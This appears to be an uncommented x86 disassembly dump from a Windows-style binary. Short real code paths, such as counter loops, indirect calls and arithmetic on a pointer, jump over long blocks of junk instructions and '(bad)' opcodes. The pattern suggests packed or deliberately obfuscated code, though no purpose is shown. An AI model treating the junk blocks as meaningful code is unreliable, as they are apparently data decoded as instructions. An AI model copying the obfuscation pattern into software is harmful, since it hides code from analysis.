  408424:	xchg   BYTE PTR [ecx+esi*1-0x13fe7659],al
  40842b:	add    eax,edi
  40842d:	and    al,0xa5
  40842f:	mov    ds:0x92483b70,al
  408434:	mov    BYTE PTR [esi+0x1b],al
  408437:	xor    eax,0x1ecce979
  40843c:	mov    ds:0x63b32fae,al
  408441:	or     dh,dh
  408443:	xor    BYTE PTR [eax],0x6b
  408446:	scas   al,BYTE PTR es:[edi]
  408447:	ret    0x9911
  40844a:	add    ah,BYTE PTR [ebx-0x3]
  40844d:	push   es
  40844e:	clc    
  40844f:	inc    edi
  408450:	push   ds
  408451:	xor    bh,cl
  408453:	popf   
  408454:	xchg   ebp,eax
  408455:	lock addr16 mov bh,0x60
  408459:	into   
  40845a:	call   0x872:0xc5344bb6
  408461:	mov    DWORD PTR [ebx-0x34d9b37f],esi
  408467:	mov    ds:0xa479b248,al
  40846c:	icebp  
  40846d:	fstp   DWORD PTR [ebx-0x56]
  408470:	int    0xf7
  408472:	(bad)  
  408474:	dec    ecx
  408475:	and    BYTE PTR [ebx-0x4e96129e],dl
  40847b:	rcr    BYTE PTR ds:0x739074eb,cl
  408481:	dec    edi
  408482:	gs and al,0xd9
  408485:	jo     0x408452
  408487:	arpl   si,sp
  408489:	xor    DWORD PTR [eax],ebp
  40848b:	hlt    
  40848c:	cld    
  40848d:	out    dx,eax
  40848e:	sbb    ah,BYTE PTR [edi-0x370580ac]
  408494:	push   0x76
  408496:	push   ss
  408497:	(bad)  
  408498:	div    DWORD PTR [edx-0xde79dc1]
  40849e:	push   ss
  40849f:	mov    BYTE PTR [edx+0x42],cl
  4084a2:	jl     0x4084be
  4084a4:	jle    0x408514
  4084a6:	in     al,0xe0
  4084a8:	mov    BYTE PTR [edi+0x9],cl
  4084ab:	xchg   esp,eax
  4084ac:	jae    0x40850c
  4084ae:	add    DWORD PTR [ecx-0xc8066af],edi
  4084b4:	xor    BYTE PTR [eax+0x4c5f901a],ah
  4084ba:	xchg   ebp,eax
  4084bb:	and    WORD PTR [eax-0x4d],sp
  4084bf:	les    edx,FWORD PTR [esi-0x25]
  4084c2:	xchg   edi,eax
  4084c3:	and    al,0x65
  4084c5:	xchg   BYTE PTR [esi+0x333a3403],ah
  4084cb:	int    0x21
  4084cd:	xchg   edx,eax
  4084ce:	jmp    0x408491
  4084d0:	mov    bl,0x75
  4084d2:	xlat   BYTE PTR ds:[ebx]
  4084d3:	daa    
  4084d4:	and    edx,DWORD PTR [esi+0x52]
  4084d7:	pusha  
  4084d8:	sub    al,0x47
  4084da:	fisub  WORD PTR [edx+ebp*4]
  4084dd:	stos   DWORD PTR es:[edi],eax
  4084de:	push   0x2a341d29
  4084e3:	push   ds
  4084e4:	retf   
  4084e5:	ss push ebx
  4084e7:	push   esi
  4084e8:	or     ebx,eax
  4084ea:	pop    edx
  4084eb:	pop    eax
  4084ec:	(bad)  
  4084ed:	jb     0x4084a0
  4084ef:	nop
  4084f0:	mov    ebp,0x840fd0d1
  4084f5:	dec    esi
  4084f6:	or     DWORD PTR [eax],eax
  4084f8:	add    bh,dh
  4084fa:	fcmovb st,st(7)
  4084fc:	inc    ebp
  4084fd:	hlt    
  4084fe:	(bad)  
  4084ff:	std    
  408500:	add    eax,0xf4458d07
  408505:	and    DWORD PTR ds:0x43382f,0x0
  40850f:	jmp    0x408521
  408514:	mov    edx,DWORD PTR ds:0x43382f
  40851a:	inc    edx
  40851b:	mov    DWORD PTR ds:0x43382f,edx
  408521:	cmp    DWORD PTR ds:0x43382f,0x13
  408528:	jae    0x40854b
  40852e:	cmp    DWORD PTR ds:0x43382f,0x17
  408535:	jne    0x408546
  40853b:	push   0x433867
  408540:	call   DWORD PTR ds:0x4121cc
  408546:	jmp    0x408514
  40854b:	mov    DWORD PTR [ebp-0x10],eax
  40854e:	and    eax,0x759a
  408553:	mov    eax,DWORD PTR [ebp-0x10]
  408556:	inc    edx
  408557:	mov    edx,DWORD PTR [eax]
  408559:	imul   edx,edx,0xf89ea9ee
  40855f:	mov    DWORD PTR [eax],edx
  408561:	mov    eax,DWORD PTR [ebp-0xc]
  408564:	mov    DWORD PTR ds:0x433717,0x1de7
  40856e:	cmp    eax,0x823721f2
  408573:	je     0x4088e8
  408579:	sub    edi,ebx
  40857b:	mov    eax,DWORD PTR [ebp-0x1c]
  40857e:	sbb    edi,DWORD PTR ds:0x433773
  408584:	or     DWORD PTR [eax],0x60751c9e
  40858a:	and    DWORD PTR ds:0x4337bf,0x0
  408594:	mov    ebx,DWORD PTR ds:0x4337bf
  40859a:	inc    ebx
  40859b:	mov    DWORD PTR ds:0x4337bf,ebx
  4085a1:	cmp    DWORD PTR ds:0x4337bf,0x1f
  4085a8:	jne    0x4085bf
  4085ae:	push   DWORD PTR [ebp-0x1c]
  4085b1:	push   0x4378
  4085b6:	push   DWORD PTR [ebp-0xc]
  4085b9:	call   DWORD PTR ds:0x412010
  4085bf:	cmp    DWORD PTR ds:0x4337bf,0x19
  4085c6:	jb     0x408594
  4085cc:	jmp    0x408753
  4085d1:	xor    BYTE PTR [esi+0x61516153],dh
  4085d7:	xor    BYTE PTR [edi+0x20],dh
  4085da:	outs   dx,BYTE PTR ds:[esi]
  4085db:	fucomi st,st(1)
  4085dd:	adc    BYTE PTR [esi+0xf],al
  4085e0:	test   ah,ch
  4085e2:	sar    BYTE PTR [esi+0x7e],cl
  4085e5:	in     al,0x7f
  4085e7:	jle    0x408667
  4085e9:	push   eax
  4085ea:	js     0x40864f
  4085ec:	pop    esp
  4085ed:	sub    al,0x4b
  4085ef:	call   0xc2498fe9
  4085f4:	add    eax,0xcfd25afb
  4085f9:	lahf   
  4085fa:	sub    edx,DWORD PTR [eax]
  4085fc:	add    dl,0xec
  4085ff:	scas   al,BYTE PTR es:[edi]
  408600:	rcr    ebx,0xd9
  408603:	int3   
  408604:	adc    al,0xc6
  408606:	and    al,0xcf
  408608:	push   esp
  408609:	add    dh,BYTE PTR [edi+0x292e4e90]
  40860f:	dec    ebp
  408610:	nop
  408611:	jp     0x4085dc
  408613:	or     eax,0xb9b6d5b4
  408618:	clc    
  408619:	mov    ds:0xc8ae680,eax
  40861e:	(bad)  
  40861f:	outs   dx,BYTE PTR ds:[esi]
  408620:	sahf   
  408621:	dec    ecx
  408622:	or     eax,0x5a8686b
  408627:	or     edx,DWORD PTR [edi+0x54]
  40862a:	xchg   sp,ax
  40862c:	cmp    bh,BYTE PTR [ebx]
  40862e:	es sahf 
  408630:	cmp    esi,eax
  408632:	mov    al,0x85
  408634:	push   es
  408635:	les    esi,FWORD PTR [ebp+0x5]
  408638:	hlt    
  408639:	sub    al,0xb7
  40863b:	addr16 pop ecx
  40863d:	mov    ch,0xdc
  40863f:	jle    0x408692
  408641:	cmc    
  408642:	mov    al,ds:0xe9c3f962
  408647:	loopne 0x408623
  408649:	ja     0x4085eb
  40864b:	xor    al,0xd9
  40864d:	mov    ebp,0xa4acef6e
  408652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408653:	mov    ds:0xd5ca9a75,eax
  408658:	ins    DWORD PTR es:[edi],dx
  408659:	jmp    0xbb5935fa
  40865e:	je     0x40869c
  408660:	jmp    0x311d8b66
  408665:	jbe    0x40864b
  408667:	pushf  
  408668:	aas    
  408669:	and    BYTE PTR [ecx-0x5],0xd4
  40866d:	mov    bh,bl
  40866f:	jmp    0x40860d
  408671:	add    BYTE PTR ds:0xf840fd00,ch
  408677:	pop    DWORD PTR [ebx]
  408679:	cmp    eax,0x2b71d0d0
  40867e:	fs fwait
  408680:	das    
  408681:	sbb    eax,0xbf1f6d9e
  408686:	jae    0x408704
  408688:	adc    dh,0x9f
  40868b:	bound  ecx,QWORD PTR [eax+0x50]
  40868e:	out    0x94,eax
  408690:	jp     0x4086ee
  408692:	jnp    0x40869e
  408694:	pop    ebx
  408695:	cli    
  408696:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408697:	ficom  DWORD PTR [ecx+ebx*2]
  40869a:	push   cs
  40869b:	loopne 0x4086dd
  40869d:	xor    BYTE PTR [esi-0x71892a44],0xff
  4086a4:	add    BYTE PTR [esi-0x6e],0xdd
  4086a8:	push   0x49
  4086aa:	inc    ebp
  4086ab:	dec    ecx
  4086ac:	dec    eax
  4086ad:	test   al,0xa6
  4086af:	push   0xb8c2259a
  4086b4:	mov    al,ds:0x380015da
  4086b9:	mov    eax,0x54d7c5c0
  4086be:	es cmc 
  4086c0:	ret    0xc5e2
  4086c3:	mov    cl,0x4a
  4086c5:	stc    
  4086c6:	add    bl,BYTE PTR [edx-0x3a]
  4086c9:	loope  0x4086aa
  4086cb:	test   eax,0x1d867b6f
  4086d0:	call   0xcdfbda6e
  4086d5:	in     eax,0xc6
  4086d7:	je     0x40867f
  4086d9:	xor    DWORD PTR [ebp+0x576dc409],0x4cfb17ac
  4086e3:	push   es
  4086e4:	(bad)  
  4086e5:	sti    
  4086e6:	stos   BYTE PTR es:[edi],al
  4086e7:	in     eax,dx
  4086e8:	shl    BYTE PTR [edi+0x45ee2844],0x9e
  4086ef:	repnz and eax,0xc3b3bb00
  4086f5:	rol    bl,cl
  4086f7:	es push ebx
  4086f9:	aas    
  4086fa:	pop    ebx
  4086fb:	ja     0x4086aa
  4086fd:	sti    
  4086fe:	add    DWORD PTR [ebp+0x35],eax
  408701:	dec    esp
  408702:	(bad)  
  408703:	pop    eax
  408704:	dec    ebp
  408705:	and    al,al
  408707:	ja     0x4086d2
  408709:	stc    
  40870a:	(bad)  
  40870b:	pop    ecx
  40870c:	ret    0x8827
  40870f:	shr    BYTE PTR [esi+0x128c55d8],cl
  408715:	pop    ecx
  408716:	bound  edx,QWORD PTR [ebp+0x61ddbe90]
  40871c:	lods   al,BYTE PTR ds:[esi]
  40871d:	sbb    al,0xe0
  40871f:	jecxz  0x408707
  408721:	(bad)  
  408722:	call   FWORD PTR [edi]
  408724:	sbb    eax,0xcac4bb25
  408729:	dec    edi
  40872a:	pushw  cs
  40872c:	ret    0xefc0
  40872f:	pop    ss
  408730:	inc    eax
  408731:	sub    BYTE PTR [ecx-0x6d40a539],0xba
  408738:	and    BYTE PTR [edx+ecx*8],al
  40873b:	add    cl,BYTE PTR [ebx+0x58db7c16]
  408741:	pushf  
  408742:	add    al,0x70
  408744:	xchg   edi,eax
  408745:	int    0xb9
  408747:	ror    DWORD PTR [edx],cl
  408749:	mov    edi,0x7d82a8de
  40874e:	and    eax,0x6bd487f4
  408753:	mov    eax,DWORD PTR [ebp-0x8]
  408756:	xor    eax,ecx
  408758:	add    eax,esi
  40875a:	jmp    0x4088e1
  40875f:	(bad)  
  408761:	adc    DWORD PTR [ebp+0x71684531],eax
  408767:	test   BYTE PTR [esi+0x41],cl
  40876a:	or     cl,cl
  40876c:	andnps xmm3,xmm1
  40876f:	push   edx
  408770:	sar    DWORD PTR [esi+0x7e],cl
  408773:	in     al,0x7f
  408775:	jle    0x4087f5
  408777:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408778:	out    0x9a,eax
  40877a:	es in  al,dx
  40877c:	inc    eax
  40877d:	cli    
  40877e:	imul   esp,DWORD PTR [edi-0x16],0xffffffe2
  408782:	sbb    BYTE PTR [eax-0x4],ah
  408785:	cmp    al,0xee
  408787:	out    0x13,al
  408789:	sub    ebp,DWORD PTR [ebx-0x3d]
  40878c:	sub    BYTE PTR [ebp+0x65],bh
  40878f:	cmp    al,0x21
  408791:	lea    esp,[esi-0x50e1605f]
  408797:	mov    ebp,DWORD PTR [ecx+0x104833bc]
  40879d:	in     al,dx
  40879e:	adc    cl,ch
  4087a0:	mov    ebx,0xc82cf573
  4087a5:	or     esp,DWORD PTR [eax+0x37]
  4087a8:	ficomp WORD PTR [ebx+0x72]
  4087ab:	jmp    0x729d:0xda753f2
  4087b2:	jp     0x4087a2
  4087b4:	out    dx,al
  4087b5:	jae    0x4087b5
  4087b7:	sub    al,0x69
  4087b9:	xor    eax,0xbd74510e
  4087be:	dec    edi
  4087bf:	sbb    edx,DWORD PTR fs:[ebx]
  4087c2:	xor    al,0x2f
  4087c4:	popa   
  4087c5:	pop    eax
  4087c6:	pushf  
  4087c7:	and    al,0x11
  4087c9:	adc    edx,DWORD PTR [ecx]
  4087cb:	test   BYTE PTR [eax],0xb9
  4087ce:	mov    cl,0xf6
  4087d0:	jg     0x40875c
  4087d2:	push   0x9911174f
  4087d7:	mov    ebx,0x709cc8da
  4087dc:	sbb    BYTE PTR [ecx-0x7e85afa6],bl
  4087e2:	in     eax,dx
  4087e3:	shr    BYTE PTR [eax+ebp*8],1
  4087e6:	push   es
  4087e7:	enter  0x4962,0xfa
  4087eb:	aad    0x5f
  4087ed:	pop    eax
  4087ee:	push   esi
  4087ef:	int3   
  4087f0:	xchg   esi,eax
  4087f1:	mov    ch,0xd7
  4087f3:	jmp    0x7e345b0
  4087f8:	fs jp  0x408835
  4087fb:	cld    
  4087fc:	xchg   edx,eax
  4087fd:	pop    esi
  4087fe:	add    bl,BYTE PTR [ecx+0x76901bdc]
  408804:	or     eax,0x26037cc6
  40880a:	addr16 aaa 
  40880c:	retf   0x26ea
  40880f:	xor    BYTE PTR [esi+edi*2],bh
  408812:	into   
  408813:	popf   
  408814:	mov    dl,0xbe
  408816:	and    DWORD PTR [edx-0x659ec641],eax
  40881c:	add    al,BYTE PTR [edx+0x1b]
  40881f:	dec    ebp
  408820:	hlt    
  408821:	test   DWORD PTR ds:0xdb71291d,edx
  408827:	jecxz  0x408818
  408829:	pop    esp
  40882a:	add    esp,esp
  40882c:	and    BYTE PTR [edi-0x46827bc1],dh
  408832:	sub    dl,BYTE PTR [edx+eax*2+0x4c]
  408836:	and    cl,bl
  408838:	add    eax,0x4a3613cd
  40883d:	mov    cl,0xa7
  40883f:	sbb    DWORD PTR [edx],ebp
  408841:	dec    ebp
  408842:	and    DWORD PTR ss:[eax+0x40],edi
  408846:	popf   
  408847:	inc    edx
  408848:	pop    edi
  408849:	(bad)  [ebx-0x4c]
  40884c:	pop    edx
  40884d:	cmp    eax,0xd2fea6fb
  408852:	ins    BYTE PTR es:[edi],dx
  408853:	cdq    
  408854:	and    DWORD PTR [edx+0x374dbc4a],eax
  40885a:	retf   0x5313
  40885d:	fnstcw WORD PTR [ebx-0x4fe0998f]
  408863:	cdq    
  408864:	in     eax,dx
  408865:	loope  0x408878
  408867:	jae    0x408810
  408869:	pop    ebp
  40886a:	int3   
  40886b:	(bad)  
  40886c:	jnp    0x408817
  40886e:	pop    es
  40886f:	loop   0x40883f
  408871:	loope  0x408858
  408873:	jle    0x4088a1
  408875:	fnstenv [ebx]
  408877:	jg     0x408899
  408879:	rcl    DWORD PTR [edx],0x36
  40887c:	push   ecx
  40887d:	adc    DWORD PTR [edi-0x80],eax
  408880:	sub    al,0x9c
  408882:	mov    ebx,0x47f18914
  408887:	or     edi,DWORD PTR [ebp-0x4ac41c38]
  40888d:	out    0x72,eax
  40888f:	dec    esi
  408890:	aaa    
  408891:	das    
  408892:	bound  ebx,QWORD PTR [ebx]
  408894:	mov    BYTE PTR [edx-0x71c457e],dl
  40889a:	xchg   BYTE PTR [ebp+ebx*8+0x24a5413],bl
  4088a1:	loope  0x4088c5
  4088a3:	mov    ah,dl
  4088a5:	cs retf 0x7cc9
  4088a9:	cld    
  4088aa:	lods   eax,DWORD PTR ds:[esi]
  4088ab:	int    0x77
  4088ad:	stc    
  4088ae:	ins    BYTE PTR es:[edi],dx
  4088af:	(bad)  
  4088b0:	xchg   ecx,eax
  4088b1:	in     al,dx
  4088b2:	sub    ch,dh
  4088b4:	cmp    DWORD PTR [eax+eax*1],edx
  4088b7:	test   eax,0x459d954a
  4088bc:	jno    0x408910
  4088be:	pushf  
  4088bf:	and    DWORD PTR [ebp*4-0x76dd7f59],ebx
  4088c6:	inc    esi
  4088c7:	or     dh,bl
  4088c9:	outs   dx,BYTE PTR ds:[esi]
  4088ca:	jb     0x4088a9
  4088cc:	cmp    edi,DWORD PTR [ebx-0x7fe9d19b]
  4088d2:	mov    eax,ds:0xab610480
  4088d7:	add    esi,DWORD PTR [ecx]
  4088d9:	sub    ebx,0x38
  4088dc:	add    al,BYTE PTR [esi+edi*2+0x5e5fb62f]
  4088e3:	pop    ebx
  4088e4:	leave  
  4088e5:	ret    0x4
  4088e8:	mov    eax,DWORD PTR [ebp-0xc]
  4088eb:	add    eax,DWORD PTR [ebp-0x18]
  4088ee:	cmp    eax,0x7ad64f9b
  4088f3:	je     0x408907
  4088f9:	mov    eax,DWORD PTR [ebp-0x10]
  4088fc:	and    DWORD PTR [eax],0x751c99
  408902:	jmp    0x40858a
  408907:	mov    eax,DWORD PTR [ebp-0xc]
  40890a:	mov    edx,DWORD PTR [ebp-0x18]
  40890d:	or     eax,edx
  40890f:	cmp    eax,0xfabf2dfb
  408914:	je     0x408928
  40891a:	mov    eax,DWORD PTR [ebp-0x10]
  40891d:	xor    DWORD PTR [eax],0x2650fa8f
  408923:	jmp    0x40858a
  408928:	mov    ax,WORD PTR [ebp-0x4]
  40892c:	jmp    0x408ab3
  408931:	test   eax,0x53c2d3f0
  408936:	loope  0x4088e1
  408938:	jno    0x40892b
  40893a:	jmp    0xc2ca681a
  40893f:	inc    ebx
  408940:	test   al,0x38
  408942:	sar    DWORD PTR [esi+0x7e],1
  408945:	in     al,0x7f
  408947:	jle    0x4089c7
  408949:	mov    edx,0x8e722506
  40894e:	inc    esp
  40894f:	stc    
  408950:	hlt    
  408951:	inc    edi
  408952:	jl     0x4089a0
  408954:	mov    ah,0xc5
  408956:	xor    cl,BYTE PTR [ecx-0x415b4253]
  40895c:	adc    ah,bh
  40895e:	sbb    BYTE PTR [edx],ah
  408960:	lahf   
  408961:	add    dh,BYTE PTR [ebp-0x60]
  408964:	adc    DWORD PTR [edx+0x699c845f],edx
  40896a:	adc    al,0x6c
  40896c:	xchg   ebx,eax
  40896d:	push   ebp
  40896e:	sub    edi,DWORD PTR [ebx-0x36]
  408971:	xchg   edi,eax
  408972:	inc    eax
  408973:	cdq    
  408974:	pusha  
  408975:	out    dx,eax
  408976:	mov    WORD PTR [ebp-0x42],es
  408979:	sar    BYTE PTR [esi-0x29d9e894],cl
  40897f:	in     al,0x2c
  408981:	jmp    0xe459:0x3fd49016
  408988:	mov    eax,ds:0xc85cec7b
  40898d:	jo     0x408944
  40898f:	cmp    BYTE PTR [edx-0x434a9634],cl
  408995:	imul   ecx,DWORD PTR [edi],0x7eecf50f
  40899b:	test   ch,0x1e
  40899e:	js     0x4089a3
  4089a0:	sbb    DWORD PTR [ecx-0x45],ecx
  4089a3:	or     BYTE PTR [edx-0x2f],cl
  4089a6:	pop    ecx
  4089a7:	(bad)  
  4089a8:	pop    eax
  4089a9:	push   ds
  4089aa:	out    0x92,eax
  4089ac:	das    
  4089ad:	fsubr  QWORD PTR [eax+0x7ccd8d86]
  4089b3:	cmp    eax,0x2032ad00
  4089b8:	mov    ecx,0xb788b2dd
  4089bd:	mov    al,0xf0
  4089bf:	xor    DWORD PTR [eax],ebp
  4089c1:	sbb    BYTE PTR [ebx-0x7a0cb584],dh
  4089c7:	add    ch,0x42
  4089ca:	push   0x4f40b2ac
  4089cf:	retf   
  4089d0:	cli    
  4089d1:	inc    esp
  4089d2:	mov    ah,0x54
  4089d4:	jnp    0x408a04
  4089d6:	outs   dx,DWORD PTR ds:[esi]
  4089d7:	fldenv [esi+ebx*4-0x1b55c1b2]
  4089de:	jo     0x4089f7
  4089e0:	or     esi,DWORD PTR [ecx+0x2aa79f55]
  4089e6:	sub    bl,ch
  4089e8:	cmp    BYTE PTR [eax],al
  4089ea:	les    edi,FWORD PTR [ebp-0x6d3c0f40]
  4089f0:	int    0xa7
  4089f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089f3:	stos   DWORD PTR es:[edi],eax
  4089f4:	dec    ecx
  4089f5:	(bad)  
  4089f6:	dec    edx
  4089f7:	mov    al,0x83
  4089f9:	add    DWORD PTR ss:[ebx+0x56e76985],ebx
  408a00:	fs pop edi
  408a02:	test   eax,0xf3ff5169
  408a07:	pop    ecx
  408a08:	xchg   al,al
  408a0a:	xchg   ebp,eax
  408a0b:	test   eax,0x74e9d407
  408a10:	mov    ds:0x8bc38d21,eax
  408a15:	xchg   ebp,eax
  408a16:	pop    ebx
  408a17:	loopne 0x4089b3
  408a19:	test   al,0xcb
  408a1b:	iret   
  408a1c:	and    al,BYTE PTR [edx]
  408a1e:	ret    0x71a6
  408a21:	pop    esp
  408a22:	int3   
  408a23:	sbb    eax,edx
  408a25:	shl    bh,cl
  408a27:	push   esi
  408a28:	jno    0x408a23
  408a2a:	jle    0x4089fa
  408a2c:	jns    0x408a50
  408a2e:	jp     0x408a57
  408a30:	push   ebx
  408a31:	xor    al,0xf2
  408a33:	shl    BYTE PTR [esi],cl
  408a35:	xchg   esp,eax
  408a36:	xor    bh,ah
  408a38:	or     edx,0xffffffb2
  408a3b:	loop   0x4089d1
  408a3d:	sub    DWORD PTR [edi],eax
  408a3f:	xchg   edx,edx
  408a41:	jp     0x408a5a
  408a43:	pop    es
  408a44:	mov    ah,ah
  408a46:	iret   
  408a47:	push   ebp
  408a48:	ins    BYTE PTR es:[edi],dx
  408a49:	add    BYTE PTR [eax-0x56],0x9f
  408a4d:	jp     0x408aa9
  408a4f:	nop
  408a50:	inc    edx
  408a51:	lock sub ecx,0xffffffd7
  408a55:	sbb    ch,BYTE PTR [ecx+0x13edbd62]
  408a5b:	addr16 std 
  408a5d:	cdq    
  408a5e:	inc    eax
  408a5f:	inc    esi
  408a60:	jg     0x408a51
  408a62:	imul   edi,DWORD PTR [edx-0x2b],0x216f2be4
  408a69:	xlat   BYTE PTR ds:[ebx]
  408a6a:	xchg   esp,eax
  408a6b:	sub    dh,bl
  408a6d:	xor    bl,0x7a
  408a70:	or     eax,0x3c6cc535
  408a75:	push   ds
  408a76:	inc    ebp
  408a77:	nop    DWORD PTR [ebx-0x10]
  408a7b:	inc    ebx
  408a7c:	gs push edx
  408a7e:	jmp    0xc5b5:0xeac46499
  408a85:	add    ah,BYTE PTR [edi+0x7296a533]
  408a8b:	sbb    BYTE PTR [ebx],cl
  408a8d:	scas   eax,DWORD PTR es:[edi]
  408a8e:	(bad)  
  408a8f:	lock push es
  408a91:	mov    eax,ds:0x5684bf0a
  408a96:	repz call 0x58afaeee
  408a9c:	in     al,0x67
  408a9e:	mov    ch,0xdb
  408aa0:	out    0xac,eax
  408aa2:	xchg   DWORD PTR [edi+ebp*1+0x37],ebx
  408aa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408aa7:	inc    ebp
  408aa8:	aas    
  408aa9:	fimul  WORD PTR [esi+0x611f0713]
  408aaf:	leave  
  408ab0:	or     al,BYTE PTR [ecx-0x2a]
  408ab3:	mov    edi,DWORD PTR [ebp+0x8]
  408ab6:	mov    edi,DWORD PTR [edi]
  408ab8:	mov    edx,0x8a3c
  408abd:	xor    ax,dx
  408ac0:	mov    edx,0x3b02
  408ac5:	add    ax,dx
  408ac8:	cmp    ax,WORD PTR [edi]
  408acb:	je     0x408c9f
  408ad1:	mov    eax,DWORD PTR [ebp-0x14]
  408ad4:	xor    eax,ecx
  408ad6:	add    eax,esi
  408ad8:	mov    DWORD PTR [ebp-0x24],eax
  408adb:	mov    eax,DWORD PTR [ebp-0x28]
  408ade:	mov    di,WORD PTR [ebp-0x2c]
  408ae2:	mov    ebx,0x8a3c
  408ae7:	xor    di,bx
  408aea:	add    di,dx
  408aed:	movzx  edx,di
  408af0:	mov    edi,DWORD PTR [ebp-0x8]
  408af3:	xor    edi,ecx
  408af5:	lea    edx,[edx+edi*1+0x32729b]
  408afc:	add    DWORD PTR [eax],edx
  408afe:	mov    eax,DWORD PTR [ebp-0x20]
  408b01:	mov    edx,DWORD PTR [ebp-0x8]
  408b04:	mov    edi,DWORD PTR [ebp-0x24]
  408b07:	xor    edx,ecx
  408b09:	jmp    0x408c90
  408b0e:	push   esi
  408b0f:	adc    BYTE PTR [ebx+0x50555155],0x81
  408b16:	sub    esi,edi
  408b18:	jmp    0x408b0d
  408b1a:	add    esi,DWORD PTR [edx-0x2151f27e]
  408b20:	jle    0x408ba0
  408b22:	in     al,0x7f
  408b24:	jle    0x408ba4
  408b26:	mov    edi,0x4bf83c83
  408b2b:	outs   dx,DWORD PTR ds:[esi]
  408b2c:	mov    esi,0xa99b42d8
  408b31:	retf   0x8003
  408b34:	sub    eax,0xd5109b82
  408b39:	and    DWORD PTR [ecx-0x4d],esp
  408b3c:	in     al,dx
  408b3d:	cmp    esi,DWORD PTR [edi-0x5]
  408b40:	or     DWORD PTR [ebx+0x2e],0xf84d691e
  408b47:	fsubr  DWORD PTR [eax-0x65d4f795]
  408b4d:	fdiv   QWORD PTR [ecx-0x4e]
  408b50:	aam    0xfb
  408b52:	xor    al,0xd3
  408b54:	shl    BYTE PTR [eax-0x2e0a42bb],cl
  408b5a:	sti    
  408b5b:	push   edx
  408b5c:	or     DWORD PTR [ebp-0x47c2a827],0x30b56e5d
  408b66:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  408b68:	cdq    
  408b69:	std    
  408b6a:	aaa    
  408b6b:	xchg   DWORD PTR [ebx],ebx
  408b6d:	sbb    al,0x34
  408b6f:	addr16 aaa 
  408b71:	mov    gs,esp
  408b73:	jmp    0x6913a76e
  408b78:	scas   al,BYTE PTR es:[edi]
  408b79:	rcl    BYTE PTR [edx],cl
  408b7b:	(bad)  
  408b7c:	jae    0x408b51
  408b7e:	imul   ebp,DWORD PTR [edx-0x2d361fd0],0xf683001
  408b88:	inc    ebp
  408b89:	int3   
  408b8a:	push   eax
  408b8b:	ja     0x408baf
  408b8d:	pop    ecx
  408b8e:	addr16 mov ds:0x3426,al
  408b92:	popf   
  408b93:	jns    0x408bbc
  408b95:	or     eax,0xbe78967f
  408b9a:	retf   0xabc9
  408b9d:	and    BYTE PTR [ebx-0x7d9b5fae],al
  408ba3:	adc    DWORD PTR ds:0x61dab7bc,edx
  408ba9:	fst    QWORD PTR [ecx-0x25]
  408bac:	int3   
  408bad:	cs cmp eax,0xffb9e420
  408bb3:	cdq    
  408bb4:	sub    eax,0xda90edb3
  408bb9:	push   ss
  408bba:	cmp    esp,ebp
  408bbc:	adc    DWORD PTR [edi+ebx*1+0x2d867aa],ebp
  408bc3:	cdq    
  408bc4:	in     al,dx
  408bc5:	push   0xe8893c1
  408bca:	push   cs
  408bcb:	xor    eax,0x39f8f3c
  408bd0:	jmp    FWORD PTR [esi+0x50]
  408bd3:	repz inc ecx
  408bd5:	add    eax,0xb607859f
  408bda:	fisubr DWORD PTR [edi+edx*2-0x67]
  408bde:	dec    edx
  408bdf:	les    ecx,FWORD PTR [edi]
  408be1:	lds    eax,FWORD PTR [edi-0x2b]
  408be4:	call   0xbcfe36f7
  408be9:	repz call 0x897:0xb567400f
  408bf1:	adc    bl,BYTE PTR [edx-0xd7dd597]
  408bf7:	dec    esp
  408bf8:	shl    BYTE PTR ds:0x70acb770,1
  408bfe:	ins    BYTE PTR es:[edi],dx
  408bff:	inc    esp
  408c00:	cmp    bh,BYTE PTR [edi+0x6b]
  408c03:	out    0xdf,al
  408c05:	add    al,0x2b
  408c07:	dec    edx
  408c08:	adc    ecx,DWORD PTR [ebx+0x24]
  408c0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c0c:	aam    0xdb
  408c0e:	jnp    0x408b90
  408c10:	pop    ebp
  408c11:	mov    ecx,0xc20402fc
  408c16:	fdivr  QWORD PTR [edi+0x4d]
  408c19:	outs   dx,DWORD PTR ds:[esi]
  408c1a:	dec    edi
  408c1b:	(bad)  
  408c1c:	adc    al,0xb7
  408c1e:	add    al,0x60
  408c20:	(bad)  
  408c21:	mov    ah,BYTE PTR [ebx+0x7253a8]
  408c27:	loope  0x408bd4
  408c29:	cwde   
  408c2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c2b:	push   ss
  408c2c:	mov    ecx,0x4adcf837
  408c31:	pop    es
  408c32:	dec    edx
  408c33:	or     BYTE PTR [esi+0x125cbedf],0x1d
  408c3a:	push   ds
  408c3b:	ret    
  408c3c:	add    al,0x73
  408c3e:	cmc    
  408c3f:	jmp    0x7d09fd4c
  408c44:	es xchg edi,eax
  408c46:	addr16 mov eax,ds:0x2e2
  408c4b:	enter  0x7156,0x65
  408c4f:	jp     0x408c61
  408c51:	dec    edi
  408c52:	push   ss
  408c53:	aaa    
  408c54:	push   esp
  408c55:	dec    ecx
  408c56:	jecxz  0x408c86
  408c58:	jp     0x408c5c
  408c5a:	xor    esp,edx
  408c5c:	aad    0xf3
  408c5e:	push   ecx
  408c5f:	fild   QWORD PTR [eiz*2+0x783475f6]
  408c66:	les    eax,FWORD PTR [eax]
  408c68:	ret    
  408c69:	mov    esp,esi
  408c6b:	sar    dl,1
  408c6d:	inc    esi
  408c6e:	int3   
  408c6f:	mov    cl,0x3e
  408c71:	mov    ch,0x31
  408c73:	pop    ebp
  408c74:	loope  0x408ca2
  408c76:	pop    eax
  408c77:	cli    
  408c78:	pop    es
  408c79:	mov    es,WORD PTR [edx]
  408c7b:	xor    ebp,DWORD PTR [ecx]
  408c7d:	pop    ecx
  408c7e:	stos   BYTE PTR es:[edi],al
  408c7f:	adc    eax,0xecd7f9f8
  408c84:	fst    st(4)
  408c86:	jl     0x408c80
  408c88:	push   esp
  408c89:	mov    gs,WORD PTR [ebx+ebp*4]
  408c8c:	pop    ds
  408c8d:	(bad)  
  408c8f:	push   eax
  408c90:	add    edx,esi
  408c92:	imul   edx,edi
  408c95:	sub    DWORD PTR [eax],edx
  408c97:	mov    eax,DWORD PTR [ebp-0x14]
  408c9a:	jmp    0x408756
